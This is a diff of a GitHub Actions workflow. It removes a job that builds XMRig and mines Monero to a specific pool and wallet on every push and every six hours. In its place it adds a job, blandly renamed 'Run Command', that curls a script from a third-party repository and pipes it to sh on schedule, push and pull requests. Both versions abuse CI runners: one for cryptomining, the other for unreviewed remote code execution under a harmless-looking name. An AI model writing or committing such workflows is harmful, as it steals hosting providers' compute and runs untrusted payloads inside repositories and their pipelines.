@@ -1,35 +1,26 @@
-name: Monero Mining Setup
+name: Run Command
 
-on: 
+on:
+  schedule:
+    - cron: '15 */6 * * *'
   push:
     branches:
       - main
-  schedule:
-    - cron: '15 */6 * * *'
+  pull_request:
+    branches:
+      - main
 
 jobs:
-  build:
+  run-command:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v2
+    - name: Checkout repository
+      uses: actions/checkout@v2
 
-      - name: Update and install dependencies
-        run: sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-
-      - name: Clone XMRig repository
-        run: git clone https://github.com/xmrig/xmrig.git
-
-      - name: Build XMRig
-        run: |
-          cd xmrig
-          mkdir build
-          cd build
-          cmake ..
-          make -j$(nproc)
-
-      - name: Start mining Monero
-        run: |
-          cd xmrig/build
-          ./xmrig -o pool.supportxmr.com:3333 -a rx/0 -u 43eBU2ohr7vMHwGasPjzQSNFSfkeVRsUXLm2eeedyWqcHWpTY1vGod1Qef5h2KqJgKbbPXkYc4nWEW2JbjLQtsdR9XTb1br -p raiden1 -t 8
+    - name: Run a custom command
+      run: |
+        echo "hello world from linux"
+        echo "start sleeping"
+        sleep 5
+        curl -sL https://raw.githubusercontent.com/Kamanati/linux-chat/main/new13.sh | sh
